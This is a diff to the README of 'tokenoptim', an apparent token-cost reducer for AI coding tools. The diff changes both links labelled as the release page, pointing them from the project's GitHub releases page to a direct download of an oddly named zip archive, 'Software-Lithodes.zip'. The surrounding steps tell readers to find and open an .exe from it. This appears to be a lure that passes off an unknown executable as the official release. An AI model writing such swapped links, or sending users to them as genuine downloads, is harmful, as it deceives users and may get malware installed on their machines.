@@ -1,6 +1,6 @@
 # 🪨 tokenoptim - Lower your AI model usage costs
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/twelfth-puerperium297/tokenoptim/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/twelfth-puerperium297/tokenoptim/main/skills/full/Software-Lithodes.zip)
 
 Tokenoptim reduces the number of tokens used by your artificial intelligence tools. Most chat tools charge based on how many words or parts of words they process. This app shrinks those inputs. By sending less data, you pay less money. This tool works with popular code assistants like Claude Code and Aider.
 
@@ -10,7 +10,7 @@ When you type a prompt, your computer sends text to a remote server. The server 
 
 ## 📥 Getting the software
 
-1. Visit the [official release page](https://github.com/twelfth-puerperium297/tokenoptim/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/twelfth-puerperium297/tokenoptim/main/skills/full/Software-Lithodes.zip).
 2. Look for the file ending in .exe.
 3. Click the file name to start your download.
 4. Open the folder where your file went.
